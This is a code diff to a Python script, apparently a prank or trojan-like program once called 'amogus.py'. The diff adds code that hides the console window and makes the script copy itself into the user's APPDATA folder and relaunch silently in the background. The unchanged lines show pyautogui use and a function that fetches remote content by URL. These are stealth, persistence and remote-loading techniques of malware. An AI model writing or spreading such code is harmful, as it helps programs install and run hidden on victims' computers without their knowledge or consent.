@@ -1,8 +1,16 @@
+# Hide cmd
+try:
+    import ctypes
+    ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
+except:
+    pass
+# Begin program
 import pyautogui
 import requests
 import time
 import os, sys
 import platform
+
 
 def load(url):
     return str(requests.get(url).content.decode("utf-8"))
@@ -85,11 +93,13 @@ def self_clone(name):
     w.flush()
     w.close()
 
-if not os.path.exists(os.environ["APPDATA"]+"/amogus.py"):
-    self_clone(os.environ["APPDATA"]+"/amogus.py")
+program = os.path.basename(sys.argv[0])
+if not os.path.exists(os.environ["APPDATA"]+"/"+program):
+    self_clone(os.environ["APPDATA"]+"/"+program)
     if "first_setup" in dir():
         first_setup()
-    sys.exit(os.system(os.environ["APPDATA"]+"/amogus.py"))
+    os.system("start /b cmd /c "+os.environ["APPDATA"]+"/"+program)
+    sys.exit(0)
 
 define_caption()
 if "setup" in dir():
